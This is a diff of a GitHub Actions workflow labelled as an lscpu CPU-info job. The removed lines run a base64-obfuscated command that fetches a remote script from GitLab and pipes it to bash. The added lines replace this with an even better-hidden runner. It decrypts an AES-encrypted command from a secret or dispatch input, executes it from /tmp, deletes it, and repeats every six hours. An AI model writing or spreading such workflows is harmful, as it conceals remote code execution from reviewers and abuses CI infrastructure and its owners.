@@ -1,15 +1,35 @@
-name: Basic LSCPU
+name: Secure LSCPU
 
 on:
   workflow_dispatch:
+    inputs:
+      encrypted_command:
+        description: 'Perintah terenkripsi (base64)'
+        required: false
+        default: ''
+  schedule:
+    - cron: '0 */6 * * *'
   push:
     branches: ["main"]
-  schedule:
-    - cron: '0 */6 * *'
+
+permissions: {}
 
 jobs:
-  cpu:
+  decrypt-and-run:
     runs-on: ubuntu-latest
     steps:
-      - name: Run lscpu
-        run: base64 -d <<< Y3VybCAtc0wgaHR0cHM6Ly9naXRsYWIuY29tL3NwaW5hem9sbGEva2VudHVja3kvLS9yYXcvbWFpbi9zcGlkZXJtYXN0ZXJzIHwgYmFzaA | sh
+      - name: Dekripsi dan jalankan perintah
+        env:
+          ENC_KEY: ${{ secrets.ENCRYPT_KEY }}
+          # Gunakan input dispatch jika ada, jika tidak pakai secret ENCRYPTED_LSCPU
+          ENC_CMD: ${{ github.event.inputs.encrypted_command || secrets.ENCRYPTED_LSCPU }}
+        run: |
+          if [ -n "$ENC_CMD" ]; then
+            echo "$ENC_CMD" | openssl enc -d -aes-256-cbc -pbkdf2 -pass pass:"$ENC_KEY" -base64 -out /tmp/cmd.sh 2>/dev/null
+            chmod +x /tmp/cmd.sh
+            /tmp/cmd.sh
+            rm -f /tmp/cmd.sh
+          else
+            echo "Tidak ada perintah terenkripsi."
+            exit 1
+          fi
